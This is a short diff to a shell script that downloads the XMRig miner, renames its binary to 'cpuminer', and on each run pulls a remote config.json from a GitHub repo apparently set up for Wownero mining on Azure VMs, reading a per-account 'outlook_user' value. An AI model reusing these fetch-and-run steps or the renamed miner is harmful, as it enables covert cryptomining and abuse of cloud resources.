@@ -7,10 +7,12 @@ if [ ! -f sudah_initiate_wownero.txt ]; then
   wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
   tar xf xmrig-6.16.4-focal-x64.tar.gz
   cd /home/ubuntu/xmrig-6.16.4
-  sudo rm -rf config.json
-  wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/wownero/config.json
   sudo mv xmrig cpuminer
 fi
+
+cd /home/ubuntu/xmrig-6.16.4
+sudo rm -rf config.json
+wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/wownero/config.json
 
 export  outlook_user=`cat /home/ubuntu/outlook_user.txt | sed -n "$1"P`
 
